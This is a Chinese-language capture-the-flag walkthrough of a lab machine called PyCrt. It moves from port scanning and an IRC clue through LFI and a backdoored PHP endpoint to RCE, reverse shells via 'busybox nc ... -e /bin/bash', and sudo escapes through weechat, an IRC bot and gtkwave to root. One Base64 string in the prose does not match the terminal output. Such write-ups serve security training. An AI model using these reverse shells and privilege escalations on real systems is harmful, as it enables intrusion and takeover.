# **一、信息收集**

## **1. 主机发现与端口扫描**

首先在本地网络中使用 `arp-scan` 确定目标主机的IP地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:75:0e:4e       PCS Systemtechnik GmbH
...
```

**端口扫描:**

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.131
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6667/tcp open  irc
...
```

扫描结果表明，目标主机IP为 `192.168.205.131`，开放了 **22 (SSH)**、**80 (HTTP)** 和 **6667 (IRC)** 端口。

## **2. 服务侦察**

* **HTTP (80端口):** 访问该端口发现是 Apache2 的默认欢迎页面，没有直接可利用的信息。

* **IRC (6667端口):** 这是关键的突破口。使用 `irssi` 客户端连接到该服务。

  ```bash
  irssi -c 192.168.205.131 -p 6667
  ```

  在连接后的服务器欢迎信息 (MOTD) 中，发现一条至关重要的线索：

  > `...issues ShadowSec directory...`
  > 这强烈暗示Web服务上可能存在一个名为 `ShadowSec` 的目录。

# **二、漏洞发现与初始访问**

## **1. Web目录与代码审计**

根据 IRC 服务提供的线索，访问 `http://192.168.205.131/ShadowSec/`，发现一个静态页面。对该目录进行深度扫描，发现一个隐藏的文件 `bydataset.php`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.131/ShadowSec/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,zip,db,bak -t 64 
...
/bydataset.php        (Status: 200)
...
```

# **2. LFI 到 RCE**

通过对 `bydataset.php` 进行参数模糊测试，发现一个 `file` 参数存在本地文件包含 (LFI) 漏洞。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.131/ShadowSec/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,zip,db,bak -t 64 
...
file                    [Status: 200, Size: 1452, Words: 13, Lines: 28, Duration: 14ms]
...

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131/ShadowSec/bydataset.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

利用该LFI漏洞，读取 `bydataset.php` 文件自身的源代码，发现其包含一个后门。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.131/ShadowSec/bydataset.php?file=bydataset.php'
```

源码审计结果如下：

*   当接收到 **POST** 请求时。
*   需要一个 `auth` 参数，其值必须为硬编码的 `'LetMeIn123!'`。
*   接收一个 `payload` 参数，该参数经过 `strrev()` (字符串反转) 和 `base64_decode()` 解码后，如果以 `cmd:` 开头，则其后的内容会被 `exec()` 函数执行。

这是一个典型的、精心构造的远程代码执行 (RCE) 漏洞。

## **3. 获取 www-data Shell**

根据源码逻辑，构造我们的Payload。

1.  **目标命令:** `id`
2.  **构造字符串:** `cmd:id`
3.  **Base64编码:** `Y21kOmlk`
4.  **字符串反转:** `klimDk12Y`

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
└─$ echo -n 'cmd:id' | base64 -w0 | rev  
klmOk12Y 
```

使用 `curl` 发送构造好的POST请求，成功验证RCE。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -X POST --data 'auth=LetMeIn123!' --data-urlencode "payload=klmOk12Y" http://192.168.205.131/ShadowSec/bydataset.php
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

接下来，构造反弹Shell的Payload，在本地Kali开启监听后，成功获取 `www-data` 用户的交互式Shell。

**本地监听:**

```bash
nc -lvnp 8888
```

**构造并执行Payload:**

```bash
# Payload: rev(base64('cmd:busybox nc 192.168.205.128 8888 -e /bin/bash'))
curl -X POST --data 'auth=LetMeIn123!' --data-urlencode "payload=oNXY..." http://...
```

# **三、权限提升**

## **1. www-data -> chatlake**

获取初步Shell后，执行 `sudo -l` 查看当前用户的 `sudo` 权限。

```bash
www-data@PyCrt:/tmp$ sudo -l
...
User www-data may run the following commands on PyCrt:
    (chatlake) NOPASSWD: /usr/bin/weechat
```

发现 `www-data` 用户可以以 `chatlake` 用户的身份，免密运行终端IRC客户端 `weechat`。这是一个提权路径。

1. 首先稳定当前shell，使其成为一个功能完整的TTY。

2. 执行提权命令，启动`weechat`。

   ```bash
   sudo -u chatlake /usr/bin/weechat
   ```

3. 在 `weechat` 客户端内部，利用其 `/exec` 功能执行命令，反弹一个新的shell。

   ```
   /exec busybox nc 192.168.205.128 9999 -e /bin/bash
   ```

4. 在本地 `9999` 端口成功接收到 `chatlake` 用户的shell。

## **2. chatlake -> pycrtlake**

获取 `chatlake` 权限后，再次执行 `sudo -l`。

```bash
chatlake@PyCrt:~$ sudo -l
...
User chatlake may run the following commands on PyCrt:
    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service
```

`chatlake` 可以免密启动一个名为 `irc_bot.service` 的服务。检查该服务文件发现，它会以 `pycrtlake` 用户身份运行一个Python脚本 `/usr/local/bin/irc_bot.py`，且我们无法直接修改这两个文件。

这表明提权需要与这个IRC机器人进行交互。

1.  首先，启动该服务：`sudo /usr/bin/systemctl start irc_bot.service`。
2.  使用 `weechat` 客户端连接到本地 `6667` 端口，并加入频道。

```
/server add x localhost/6667
/connect x
/LIST
         │00:56:17       x  -- | End of message of the day.
         │00:56:46       x  -- | Channel Users Name
         │00:56:46       x  -- | #chan2(1): [+nt]
         │00:56:46       x  -- | #chan3(1): [+nt]
         │00:56:46       x  -- | #chan4(1): [+nt]
         │00:56:46       x  -- | #chan5(1): [+nt]
         │00:56:46       x  -- | #chan6(1): [+nt]
         │00:56:46       x  -- | #chan1(1): [+nt]
```

3.  在频道6中，一个名为 `@admin` 的机器人提示需要遵循“格式要求”，并以 `:)` 结尾。
4.  **发现漏洞利用条件：** 与机器人交互后发现，其存在一个复杂的触发机制：
    - **格式要求：** 命令内容必须是**以空格分隔的ASCII十进制编码**，并以 :) 结尾。在测试中发现，机器人会拒绝所有包含字母的直接命令，但接受纯数字输入，这强烈暗示了需要进行编码转换。
    - **用户名要求：** 必须将自己的昵称更改为 ll104567 (/nick ll104567)，否则机器人会拒绝执行命令。
    - **交互逻辑：** 构造好的命令需要发送到 #chan1 公共频道，但命令的执行结果会由机器人 @admin **私聊**回显。

5. 根据以上条件，构造反弹shell的ASCII码payload，并在#chan1频道发送。
6. 在监听端口成功接收到 pycrtlake 用户的shell。

## **3. pycrtlake -> root**

这是最后一步提权。在 `pycrtlake` shell中执行 `sudo -l`。

```bash
pycrtlake@PyCrt:~$ sudo -l
...
User pycrtlake may run the following commands on PyCrt:
    (ALL) NOPASSWD: /usr/bin/gtkwave
```

`pycrtlake` 用户可以免密以 `root` 身份运行GUI程序 `gtkwave`。

1. 直接运行会因缺少 `DISPLAY` 环境变量而失败。

2. 该程序的 `-W` 命令行模式也因同样原因无法直接使用。

3. **最终解决方案：** 使用 **Xvfb (X Virtual Framebuffer)** 创建一个虚拟的图形环境来欺骗 `gtkwave`。

4. 首先，在 `/tmp` 目录启动一个虚拟显示服务。

   ```bash
   Xvfb :1 &
   ```

5. 利用 `gtkwave` 的 `-W` (wish) 参数，在指定的虚拟显示环境中启动一个拥有 `root` 权限的Tcl交互式命令行。

   ```bash
   sudo DISPLAY=:1 /usr/bin/gtkwave -W
   ```

6. 命令执行后，会得到一个Tcl的提示符 `%`。在这个 `root` 权限的shell中，可以直接读取 `root` 目录下的最终flag。

   ```tcl
   % id
   uid=0(root) gid=0(root) groups=0(root)
   % cat /root/root.txt /home/chatlake/user.txt
   flag{e80ecc46ca5e00bf8a51c47f0cc3e868}
   flag{b42baba466402e32157a1cbba819664e}
   ```

